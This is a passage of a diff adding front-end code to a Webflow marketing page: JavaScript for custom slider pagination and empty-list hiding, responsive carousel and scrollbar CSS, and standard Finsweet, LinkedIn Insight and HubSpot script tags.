+    const listNav = block.querySelector('[data-tm="list-nav"]');
+    const template = listNav?.querySelector('[data-tm="pagination-div"]');
+    if (!slider || !listNav || !template) return;
+
+    block.setAttribute(INIT_FLAG, "1");
+
+    function getCompaniesUnique() {
+      const raw = Array.from(slider.querySelectorAll('[data-tm="company"]'))
+        .map((el) => (el.textContent || "").trim())
+        .filter(Boolean);
+
+      const seen = new Set();
+      const unique = [];
+      for (const n of raw) {
+        if (!seen.has(n)) {
+          seen.add(n);
+          unique.push(n);
+        }
+      }
+      return unique;
+    }
+
+    function build() {
+      const dots = Array.from(slider.querySelectorAll(".w-slider-nav .w-slider-dot"));
+      const companies = getCompaniesUnique();
+      const count = dots.length >= 2 ? dots.length : companies.length;
+      if (count < 2) return;
+
+      // Clone template before wipe
+      const tpl = template.cloneNode(true);
+
+      // Build blocks
+      const frag = document.createDocumentFragment();
+      const items = [];
+
+      for (let i = 0; i < count; i++) {
+        const el = tpl.cloneNode(true);
+
+        // Click -> navigate via dots if available
+        if (dots.length >= 2) {
+          el.addEventListener("click", () => dots[i]?.click());
+        }
+
+        frag.appendChild(el);
+        items.push(el);
+      }
+
+      listNav.innerHTML = "";
+      listNav.appendChild(frag);
+
+      let last = -1;
+
+      function getActiveIndex() {
+        if (dots.length >= 2) {
+          const activeDot = slider.querySelector(".w-slider-nav .w-slider-dot.w-active");
+          const idx = dots.indexOf(activeDot);
+          return idx >= 0 ? idx : 0;
+        }
+
+        const activeSlide = slider.querySelector(".w-slide.w-active");
+        const name = (activeSlide?.querySelector('[data-tm="company"]')?.textContent || "").trim();
+        const idx = companies.indexOf(name);
+        return idx >= 0 ? idx : 0;
+      }
+
+      function update() {
+        const idx = getActiveIndex();
+        if (idx === last) return;
+        last = idx;
+
+        items.forEach((el, i) => {
+          el.style.backgroundColor = i === idx ? "#FFFFFF" : "#000000";
+        });
+      }
+
+      update();
+
+      // Clear old interval if any
+      if (block._tmPaginationInterval) clearInterval(block._tmPaginationInterval);
+      block._tmPaginationInterval = setInterval(update, 120);
+    }
+
+    // Wait for slider content to be ready, then build
+    waitFor(() => {
+      const dotsCount = slider.querySelectorAll(".w-slider-nav .w-slider-dot").length;
+      const companiesCount = getCompaniesUnique().length;
+      return dotsCount >= 2 || companiesCount >= 2;
+    }, 6000).then(build).catch(build);
+  }
+
+  document.addEventListener("DOMContentLoaded", initAll);
+
+  // Run when returning via bfcache (Safari/Chrome back button)
+  window.addEventListener("pageshow", () => {
+    document.querySelectorAll(`[${INIT_FLAG}]`).forEach((el) => el.removeAttribute(INIT_FLAG));
+    initAll();
+  });
+
+  // Watch for “page swapped” situations (AJAX / transitions)
+  const mo = new MutationObserver(() => initAll());
+  mo.observe(document.documentElement, { childList: true, subtree: true });
+})();
+</script>
+
+
+<!-- Testimonial CMS slider -->
+
+<script async type="module"
+src="https://cdn.jsdelivr.net/npm/@finsweet/attributes@2/attributes.js" 
+fs-list
+></script>
+
+
+<!-- ======================================================
+  RESOURCES SLIDER — CUSTOM PAGINATION
+  + MULTI-VISIBLE SLIDES (3/2/1) + MOVE BY 1
+====================================================== -->
+
+
+<script>
+(function () {
+  function hideEmptyListBlocks() {
+    document.querySelectorAll(".list-block").forEach((block) => {
+      const collectionWrapper = block.querySelector(
+        ".resources-collection-list-wrapper"
+      );
+
+      if (!collectionWrapper) return;
+
+      const isEmpty = !!collectionWrapper.querySelector(".w-dyn-empty");
+
+      block.style.display = isEmpty ? "none" : "";
+    });
+  }
+
+  function run() {
+    hideEmptyListBlocks();
+    requestAnimationFrame(hideEmptyListBlocks);
+    setTimeout(hideEmptyListBlocks, 200);
+    window.addEventListener("load", hideEmptyListBlocks, { once: true });
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", run, { once: true });
+  } else {
+    run();
+  }
+})();
+</script>
+
+<script>
+(() => {
+  const INIT_FLAG = "data-resources-pagination-init";
+  const STYLE_FLAG = "data-resources-slider-style";
+
+  function injectMultiSlideCSS() {
+    if (document.querySelector(`style[${STYLE_FLAG}]`)) return;
+
+    const css = `
+      /* ================================
+         RESOURCES SLIDER: MULTI-VISIBLE
+         Desktop: 3 | Tablet: 2 | Mobile: 1
+         Moves by 1 slide (Webflow default)
+      ================================= */
+
+      [data-resources="slider"] .w-slider-mask {
+        overflow: hidden; /* keep cropping like a proper carousel */
+      }
+
+      /* Webflow uses a track inside the mask; make it flex so slides can be fractional width */
+      [data-resources="slider"] .w-slider-track {
+        display: flex !important;
+        will-change: transform;
+      }
+
+      /* Default: 1 visible (mobile portrait + landscape) */
+      [data-resources="slider"] .w-slide {
+        flex: 0 0 100% !important;
+        width: 100% !important;
+      }
+
+      /* Tablet: 2 visible */
+      @media (min-width: 768px) and (max-width: 991px) {
+        [data-resources="slider"] .w-slide {
+          flex-basis: 50% !important;
+          width: 50% !important;
+        }
+      }
+
+      /* Desktop: 3 visible */
+      @media (min-width: 992px) {
+        [data-resources="slider"] .w-slide {
+          flex-basis: 33.3333% !important;
+          width: 33.3333% !important;
+        }
+      }
+    `;
+
+    const style = document.createElement("style");
+    style.setAttribute(STYLE_FLAG, "1");
+    style.appendChild(document.createTextNode(css));
+    document.head.appendChild(style);
+  }
+
+  function waitFor(testFn, timeoutMs) {
+    return new Promise((resolve, reject) => {
+      const start = performance.now();
+      const tick = () => {
+        if (testFn()) return resolve();
+        if (performance.now() - start > timeoutMs) return reject();
+        requestAnimationFrame(tick);
+      };
+      tick();
+    });
+  }
+
+  function initAll() {
+    injectMultiSlideCSS();
+    document.querySelectorAll('[data-resources="resource"]').forEach(initOne);
+  }
+
+  function initOne(block) {
+    if (block.hasAttribute(INIT_FLAG)) return;
+
+    const slider = block.querySelector('[data-resources="slider"]');
+    const listNav = block.querySelector('[data-resources="list-nav"]');
+    const template = listNav?.querySelector('[data-resources="pagination-div"]');
+    if (!slider || !listNav || !template) return;
+
+    block.setAttribute(INIT_FLAG, "1");
+
+    function build() {
+      const dots = Array.from(
+        slider.querySelectorAll(".w-slider-nav .w-slider-dot")
+      );
+      if (dots.length < 2) return;
+
+      const tpl = template.cloneNode(true);
+      const frag = document.createDocumentFragment();
+      const items = [];
+
+      dots.forEach((dot) => {
+        const el = tpl.cloneNode(true);
+        el.addEventListener("click", () => dot.click());
+        frag.appendChild(el);
+        items.push(el);
+      });
+
+      listNav.innerHTML = "";
+      listNav.appendChild(frag);
+
+      let last = -1;
+
+      function getActiveIndex() {
+        const active = slider.querySelector(".w-slider-dot.w-active");
+        const idx = dots.indexOf(active);
+        return idx >= 0 ? idx : 0;
+      }
+
+      function update() {
+        const idx = getActiveIndex();
+        if (idx === last) return;
+        last = idx;
+
+        items.forEach((el, i) => {
+          el.style.backgroundColor = i === idx ? "#FFFFFF" : "#000000";
+        });
+      }
+
+      update();
+
+      if (block._resourcesPaginationInterval) {
+        clearInterval(block._resourcesPaginationInterval);
+      }
+      block._resourcesPaginationInterval = setInterval(update, 120);
+    }
+
+    waitFor(
+      () =>
+        slider.querySelectorAll(".w-slider-nav .w-slider-dot").length >= 2,
+      6000
+    )
+      .then(build)
+      .catch(build);
+  }
+
+  document.addEventListener("DOMContentLoaded", initAll);
+
+  window.addEventListener("pageshow", () => {
+    document
+      .querySelectorAll(`[${INIT_FLAG}]`)
+      .forEach((el) => el.removeAttribute(INIT_FLAG));
+    initAll();
+  });
+
+  new MutationObserver(initAll).observe(document.documentElement, {
+    childList: true,
+    subtree: true
+  });
+})();
+</script>
+<script type="text/javascript">
+_linkedin_partner_id = "9116138";
+window._linkedin_data_partner_ids = window._linkedin_data_partner_ids || [];
+window._linkedin_data_partner_ids.push(_linkedin_partner_id);
+</script><script type="text/javascript">
+(function(l) {
+if (!l){window.lintrk = function(a,b){window.lintrk.q.push([a,b])};
+window.lintrk.q=[]}
+var s = document.getElementsByTagName("script")[0];
+var b = document.createElement("script");
+b.type = "text/javascript";b.async = true;
+b.src = "https://snap.licdn.com/li.lms-analytics/insight.min.js";
+s.parentNode.insertBefore(b, s);})(window.lintrk);
+</script>
+<noscript>
+<img height="1" width="1" style="display:none;" alt="" src="https://px.ads.linkedin.com/collect/?pid=9116138&fmt=gif" />
+</noscript><style>
+  /* ================================
+     Sticky TOC scrollbar styling
+     Target: .sticky-resource-menu-toc
+     ================================ */
+
+  .sticky-resource-menu-toc {
+    /* kill horizontal scroll */
+    overflow-x: clip !important;   /* use hidden if you need legacy */
+    overflow-y: auto !important;
+
+    /* Firefox */
+    scrollbar-width: thin;
+    scrollbar-color: rgba(255,255,255,.25) transparent;
+  }
+
+  /* WebKit (Chrome/Edge/Safari) */
+  .sticky-resource-menu-toc::-webkit-scrollbar {
+    width: 4px;           /* vertical scrollbar width */
+    height: 0px;          /* effectively disables horizontal scrollbar */
+  }
+
+  .sticky-resource-menu-toc::-webkit-scrollbar-track {
+    background: transparent;
+  }
+
+  .sticky-resource-menu-toc::-webkit-scrollbar-thumb {
+    background-color: rgba(255,255,255,.25);
+    border-radius: 0px;
+    border: 2px solid transparent;     /* makes thumb look slimmer */
+    background-clip: content-box;
+  }
+
+  .sticky-resource-menu-toc::-webkit-scrollbar-thumb:hover {
+    background-color: rgba(255,255,255,.45);
+  }
+
+  /* Optional: prevent accidental 1px overflow from children */
+  .sticky-resource-menu-toc * {
+    max-width: 100%;
+  }
+</style><script src="https://hubspotv2.use1-marketplace-1p-apps-prod-red.if.webflow.services/static/loader.js" type="text/javascript" async="" defer=""></script></body></html>
